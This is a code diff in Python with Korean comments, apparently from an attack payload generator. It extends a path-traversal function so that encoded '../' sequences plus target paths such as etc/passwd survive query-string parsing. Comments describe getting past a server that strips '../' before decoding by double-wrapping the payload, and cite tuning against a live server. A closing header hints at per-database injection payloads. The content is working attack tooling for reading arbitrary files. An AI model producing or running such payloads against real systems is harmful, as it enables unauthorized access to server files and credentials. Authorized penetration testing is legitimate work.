@@ -35,16 +35,47 @@ def encode(value: str, scheme: str = "none") -> str:
     raise ValueError(f"모르는 인코딩: {scheme}")
 
 
+# 쿼리스트링 안에서 뜻이 달라지는 글자. 경로에 들어 있으면 그대로 보낼 수 없다.
+#   '+'  → 서버가 공백으로 읽는다. /opt/java/jdk-11.0.24+8 이 404 로 오던 원인이다(11-04 실측)
+#   '&'  → 다음 파라미터가 시작된 것으로 읽는다
+#   '='  → 이름과 값의 경계로 읽는다
+#   '#'  → 프래그먼트가 시작돼 뒤가 서버까지 가지 않는다
+#   '?'  → 두 번째 물음표
+#   ';'  → 옛 규약에서 파라미터 구분자로 읽는 서버가 있다
+#   ' '  → 그대로 보낼 수 없다
+#   '%'  → 뒤 두 글자를 16진수로 읽어 엉뚱한 글자가 된다
+UNSAFE_IN_QUERY = "+&=#?; %"
+
+
+def _safe_in_query(path: str, scheme: str) -> str:
+    """경로 본문에서 쿼리스트링을 깨는 글자만 골라 바꾼다.
+
+    `/` 같은 보통 글자는 **그대로 둔다** — 11-03 실측에 쓴 스크립트가 그 형태이고,
+    서버도 쿼리 값 안의 `/` 를 그냥 받는다. 여기서 손대는 것은 안 바꾸면 **뜻이
+    달라지는** 글자뿐이다.
+
+    바꾸는 방식은 ../ 에 쓴 것과 맞춘다. 서버가 '../ 제거 → 디코딩' 순서로 처리하므로,
+    한 번만 감싸면 제거 단계에서 이미 풀려 버려 경로가 어긋난다.
+    """
+    if scheme in ("none", "dots"):          # 감싸지 않는 방식은 경로도 건드리지 않는다
+        return path
+    wrap = {"url": _pct, "double": lambda c: _pct(c).replace("%", "%25"),
+            "double-full": lambda c: _pct(_pct(c))}[scheme]
+    return "".join(wrap(c) if c in UNSAFE_IN_QUERY else c for c in path)
+
+
 def traversal(path: str, depth: int = 9, scheme: str = "none") -> str:
     """읽으려는 경로를 '위로 올라가는' 형태로 만든다.
 
     path='etc/passwd', depth=3, scheme='url' → %2e%2e%2f×3 + etc/passwd
     depth 는 저장 폴더에서 몇 단계 위로 올라갈지다. 모르면 넉넉히 준다
     (이미 최상위면 더 올라가도 최상위에 머문다).
-    경로 자체는 바꾸지 않는다 — 걸러지는 것은 ../ 뿐이고, 경로까지 바꾸면
-    서버가 못 찾는 경우가 있다.
+
+    경로의 보통 글자는 바꾸지 않는다 — 걸러지는 것은 ../ 뿐이다. 다만 쿼리스트링
+    안에서 뜻이 달라지는 글자(`+` 등)는 바꿔야 한다. 안 그러면 **있는 파일이
+    없는 것처럼 404 로 돌아온다.**
     """
-    return encode("../", scheme) * max(0, depth) + path.strip("/")
+    return encode("../", scheme) * max(0, depth) + _safe_in_query(path.strip("/"), scheme)
 
 
 # ── DBMS 별 표현 ──────────────────────────────────────────────
